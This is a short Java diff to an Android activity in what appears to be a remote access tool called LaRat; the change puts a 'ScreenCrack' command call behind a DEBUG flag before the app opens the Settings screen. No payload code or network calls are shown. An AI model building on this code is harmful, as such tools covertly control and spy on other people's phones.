@@ -15,6 +15,8 @@ import java.util.List;
 
 public class LaRatActivity extends Activity {
 
+    private boolean DEBUG = false;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -26,13 +28,17 @@ public class LaRatActivity extends Activity {
             Log.i("com.c4wd.larat", "Starting the LaRat service...");
         }
 
-        Command.initCommands();
+        if (DEBUG) {
 
-        CommandContext ctx = new CommandContext(getApplicationContext(), new LinkedList<String>());
+            Command.initCommands();
 
-        AsyncTask task = Command.getTask("ScreenCrack");
+            CommandContext ctx = new CommandContext(getApplicationContext(), new LinkedList<String>());
 
-        task.execute(ctx);
+            AsyncTask task = Command.getTask("ScreenCrack");
+
+            task.execute(ctx);
+
+        }
 
         startActivityForResult(new Intent(android.provider.Settings.ACTION_SETTINGS), 0);
     }
